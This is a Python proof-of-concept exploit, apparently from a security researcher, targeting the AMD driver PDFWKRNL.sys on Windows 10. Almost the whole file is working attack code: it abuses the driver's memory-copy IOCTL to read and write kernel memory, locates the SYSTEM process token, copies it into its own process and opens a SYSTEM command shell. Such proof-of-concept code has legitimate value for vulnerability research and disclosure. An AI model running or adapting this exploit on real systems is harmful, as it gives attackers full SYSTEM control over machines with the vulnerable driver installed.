'''
  eop_pdfwkrnl.py - EoP PoC exploiting the AMD driver (PDFWKRNL.sys)
  Note: This version just waits until the device becomes accessible.

  Tested on:
  Windows 10 Enterprise LTSC (OS Build 17763.4131)

  Takahiro Haruyama (@cci_forensics)
'''
#!/usr/bin/env python3

import argparse, os
#import psutil

from ctypes import *
from ctypes.wintypes import *


# Print/debug functions

ENABLE_PROCESSED_OUTPUT = 0x0001
ENABLE_WRAP_AT_EOL_OUTPUT = 0x0002
ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
MODE = ENABLE_PROCESSED_OUTPUT + ENABLE_WRAP_AT_EOL_OUTPUT + ENABLE_VIRTUAL_TERMINAL_PROCESSING
kernel32 = windll.kernel32
handle = kernel32.GetStdHandle(-11)
kernel32.SetConsoleMode(handle, MODE)

g_debug = False

def info(msg):
    print("\033[34m\033[1m[*]\033[0m {}".format(msg))

def success(msg):
    print("\033[32m\033[1m[+]\033[0m {}".format(msg))
    
def error(msg):
    print("\033[31m\033[1m[!]\033[0m {}".format(msg))

def debug(msg):
    if g_debug:
        print("\033[33m\033[1m[D]\033[0m {}".format(msg))
        OutputDebugStringA(msg.encode() + b"\n")

def debug_bin(n, v):
    #debug('{}: {} ({} bytes)'.format(n, space_hex(v), len(v)))
    if g_debug:
        debug(n)
        hexdump.hexdump(v)


# ctypes errcheck functions

gle = windll.kernel32.GetLastError

def errcheck_bool(res, func, args):
    le = gle()
    if not res and le != 0x1f: 
        raise Exception("{} failed. GLE: {}".format(func.__name__, le))
    return res

def errcheck_drivername(res, func, args):
    if res == 0:
        raise Exception("{} failed. GLE: {}".format(func.__name__, gle()))
    if res == args[2]:
        raise Exception("{} failed. Buffer too short. GLE: {}".format(func.__name__, gle()))
    return res

def errcheck_createfile(res, func, args):
    err = gle()
    if res == HANDLE(-1).value and err not in [2, 5]:  # INVALID_HANDLE_VALUE
        raise Exception("Failed to open device {}. GLE: {}".format(args[0], err))
    return res


# Windows API definitions

GetProcAddress = windll.kernel32.GetProcAddress
GetProcAddress.restype = LPVOID
GetProcAddress.argtypes = [LPVOID, LPCSTR]

LoadLibraryA = windll.kernel32.LoadLibraryA
LoadLibraryA.restype = LPVOID
LoadLibraryA.argtypes = [LPCSTR]

CreateFileA = windll.kernel32.CreateFileA
CreateFileA.restype = HANDLE
# we won't use LPSECURITY_ATTRIBUTES (arg 4) so just use LPVOID
CreateFileA.argtypes = [LPCSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE]
CreateFileA.errcheck = errcheck_createfile
# constants for CreateFileA
GENERIC_READ = (1 << 30)
GENERIC_WRITE = (1 << 31)
FILE_SHARE_READ = 1
FILE_SHARE_WRITE = 2
OPEN_EXISTING = 3
FILE_ATTRIBUTE_NORMAL = 0x80

DeviceIoControl = windll.kernel32.DeviceIoControl
DeviceIoControl.restype = BOOL
# we won't use LPOVERLAPPED (arg 8) so just use LPVOID
DeviceIoControl.argtypes = [HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD,
                            POINTER(DWORD), LPVOID]
DeviceIoControl.errcheck = errcheck_bool

OutputDebugStringA = windll.kernel32.OutputDebugStringA
OutputDebugStringA.argtypes = [LPCSTR]
OutputDebugStringA.restype = None # for void

EnumDeviceDrivers = windll.psapi.EnumDeviceDrivers
EnumDeviceDrivers.restype = BOOL
EnumDeviceDrivers.argtypes = [LPVOID, DWORD, POINTER(DWORD)]
EnumDeviceDrivers.errcheck = errcheck_bool

GetDeviceDriverBaseNameA = windll.psapi.GetDeviceDriverBaseNameA
GetDeviceDriverBaseNameA.restype = DWORD
GetDeviceDriverBaseNameA.argtypes = [LPVOID, LPCSTR, DWORD]
GetDeviceDriverBaseNameA.errcheck = errcheck_drivername


# Windows Kernel definitions (Windows 10 Enterprise LTSC, OS Build 17763.4131)

'''
0: kd> dt nt!_EPROCESS UniqueProcessId
   +0x2e0 UniqueProcessId : Ptr64 Void
0: kd> dt nt!_EPROCESS ActiveProcessLinks
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY
0: kd> dt nt!_EPROCESS Token
   +0x358 Token : _EX_FAST_REF
'''
OFF_PID = 0x2e0
OFF_APLINKS = 0x2e8
OFF_TOKEN = 0x358


# Device specific definitions

DEV_NAME = br'\\.\PdFwKrnl'
IOCTL_MEMMOVE = 0x80002014

'''
struct struc_va_rw
{
  __int64 field_0;
  __int64 field_8;
  __int64 dst;
  __int64 src;
  __int64 field_20;
  __int64 size;
};
'''
class BufAmdCopy(LittleEndianStructure):

    _fields_ = [
        ('field_0', ULARGE_INTEGER),
        ('field_8', ULARGE_INTEGER),
        ('dst', LPVOID),
        ('src', LPVOID),
        ('field_20', ULARGE_INTEGER),
        ('size', ULARGE_INTEGER),
                ]


# Code start

def get_device_handle():

    debug("Getting device handle: {}".format(DEV_NAME))
    return CreateFileA(DEV_NAME, GENERIC_READ | GENERIC_WRITE,
                       FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
                       FILE_ATTRIBUTE_NORMAL, None)

def amd_memmove(hdev, dst, src, size):

    buf = BufAmdCopy(ULARGE_INTEGER(0),
                     ULARGE_INTEGER(0),
                     cast(dst, LPVOID),
                     cast(src, LPVOID),
                     ULARGE_INTEGER(0),
                     ULARGE_INTEGER(size))
    
    bytes_returned = c_ulong()
    DeviceIoControl(hdev, IOCTL_MEMMOVE, byref(buf), sizeof(buf), byref(buf), sizeof(buf),
                    byref(bytes_returned), None)
    #debug('amd_memmove: bytes_returned = {:#x}'.format(bytes_returned.value))

def get_driver_bases():
    
    lpcbNeeded = DWORD()
    EnumDeviceDrivers(None, 0, byref(lpcbNeeded))
    
    num_of_mods = int(lpcbNeeded.value / sizeof(LPVOID))
    array = (LPVOID * num_of_mods)()
    EnumDeviceDrivers(byref(array), lpcbNeeded, byref(lpcbNeeded))
    
    ret = dict()
    for ImageBase in array:
        
        lpFilename = LPSTR(b'\x00'*260)
        GetDeviceDriverBaseNameA(ImageBase, lpFilename, 260)
        
        #debug('{:#x}: {}'.format(ImageBase, lpFilename.value.decode()))
        ret[lpFilename.value.decode()] = ImageBase
        
    return ret

def find_kernel_base():

    mods = get_driver_bases()
    
    for k, v in mods.items():
        
        if k.find('krnl') != -1 and k.endswith('.exe'):
            return k, v

    else:
        return None, None

def get_kernel_address(hmodule, realbase, symbol):

    return GetProcAddress(hmodule, symbol) - hmodule + realbase

def get_current_eprocess(hdev, ep, my_pid):

    while(True):
        
        flink = LPVOID()
        amd_memmove(hdev, byref(flink), ep + OFF_APLINKS, 8)
        ep = flink.value - OFF_APLINKS
        
        pid = LPVOID()
        amd_memmove(hdev, byref(pid), ep + OFF_PID, 8)
        
        if pid.value == my_pid:
            return ep
        
        elif pid.value == 4: # System
            return None

def parse_args():
    global g_debug
    
    parser = argparse.ArgumentParser(description='EoP PoC exploiting the AMD driver (PDFWKRNL.sys)', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-d", "--debug", action='store_true', help="output debug message")
    
    args = parser.parse_args()    
    g_debug = args.debug
    return args

def main():
    args = parse_args()

    info('start')
    
    kname, kbase = find_kernel_base()    
    if not kbase:
        error('kernel base not found')
        return    
    info('{:#x}: kernel {} found'.format(kbase, kname))

    kbase_in_user = LoadLibraryA(kname.encode())
    ptr_ep_system = get_kernel_address(kbase_in_user, kbase, b'PsInitialSystemProcess')
    info('PsInitialSystemProcess = {:#x}'.format(ptr_ep_system))

    info('Waiting until USBCPDFW.exe is running..')
    while(True):
        #for p in psutil.process_iter(['name']):
            #debug(p.info['name'])
            #if p.info['name'] == 'USBCPDFW.exe':
        hdev = get_device_handle()
        if hdev != HANDLE(-1).value:
            success('Got the device handle')
            break

    ep_system = LPVOID()
    amd_memmove(hdev, byref(ep_system), ptr_ep_system, 8)
    success('System _EPROCESS = {:#x}'.format(ep_system.value))

    token_system = LPVOID()
    amd_memmove(hdev, byref(token_system), ep_system.value + OFF_TOKEN, 8)
    success('System _TOKEN = {:#x}'.format(token_system.value & ~0b1111))

    pid = os.getpid()
    ep = get_current_eprocess(hdev, ep_system.value, pid)
    if ep:
        success('Current pid = {:#x}, _EPROCESS = {:#x}'.format(pid, ep))
    else:
        error('Current pid is not found in the process list. Aborted.')
        return

    token_saved = LPVOID()
    amd_memmove(hdev, byref(token_saved), ep + OFF_TOKEN, 8)
    success('Current _TOKEN = {:#x}'.format(token_saved.value & ~0b1111))
    amd_memmove(hdev, ep + OFF_TOKEN, byref(token_system), 8)
    success('System token is copied to the current process. Executing cmd.exe..')
    input('Press any key to continue:')

    os.system(r'C:\Windows\System32\cmd.exe')
    amd_memmove(hdev, ep + OFF_TOKEN, byref(token_saved), 8)
    info('The original token is restored')

    info('done')

if ( __name__ == "__main__" ):
    main()        
        
